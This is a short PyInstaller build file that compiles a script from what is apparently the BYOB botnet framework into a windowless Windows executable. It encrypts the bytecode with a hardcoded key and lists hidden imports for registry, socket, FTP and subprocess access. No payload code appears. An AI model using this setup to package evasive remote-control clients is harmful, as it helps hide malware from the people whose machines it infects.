# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key='CZV?Efe:0llA7MDE')
a = Analysis(['byob_tYl.py'],
             pathex=['/Users/ppete/Documents/byob/byob'],
             binaries=[],
             datas=[],
             hiddenimports=['zlib', 'base64', 'sys', 'marshal', 'json', 'urllib', 'zlib', 'threading', 'random', 'errno', '_winreg', 'base64', 'ctypes', 'sys', 'subprocess', 'requests', 'copy', 'os', 'collections', 'colorama', 'ftplib', 'socket', 'uuid', 'logging', 'functools', 'hashlib', 'StringIO', 'numpy', 'zipfile', 'time', 'struct', 'json'],
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='byob_tYl',
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon=None)
